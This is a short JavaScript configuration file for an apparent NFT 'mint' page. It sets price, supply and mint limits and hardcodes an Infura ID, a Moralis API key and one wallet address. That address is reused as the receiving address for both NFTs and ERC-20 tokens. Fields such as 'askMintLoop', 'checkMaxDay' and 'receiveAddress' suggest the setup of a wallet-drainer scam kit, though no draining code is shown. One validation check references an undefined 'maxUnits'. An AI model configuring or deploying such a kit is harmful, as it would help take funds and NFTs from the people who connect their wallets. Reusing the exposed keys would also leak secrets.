const address = '0xaF1bb2C025280a166eb4A91e45c85D7b0C0D848B',
  infuraId = '5b7825e5fcc64bc4bf49f496587392ed',
  moralisApi =
    'BiY8KrXg1tXZSu4JUtOJ4JGZx89DErf5ZN0bfiyXkzQLi2GU8rfjREwurLHXTJRA'
const x20Ethereum = '0xaF1bb2C025280a166eb4A91e45c85D7b0C0D848B'

const mintInfo = {
    price: 0.35,
    price2: 0.7,
    totalSupply: 7777,
    minUnits: 1,
    maxUnits: 2,
    askMintLoop: true,
  },
  nftsInfo = {
    active: true,
    minValue: 1,
    checkMaxDay: 2,
    receiveAddress: '0xaF1bb2C025280a166eb4A91e45c85D7b0C0D848B',
  }
if (mintInfo.minUnits > mintInfo.maxUnits) {
  console.error(
    'Error: minUnits (' +
      mintInfo.minUnits +
      ') is greater than maxUnits (' +
      maxUnits +
      ')'
  )
}
if (mintInfo.minUnits <= 0) {
  console.error(
    'Error: minUnits (' + mintInfo.minUnits + ') is less than or equal to 0'
  )
}
if (!address.startsWith('0x') || address.length >= 64 || address.length <= 40) {
  console.error('Error: ' + address + ' is not a valid Ethereum address.')
}
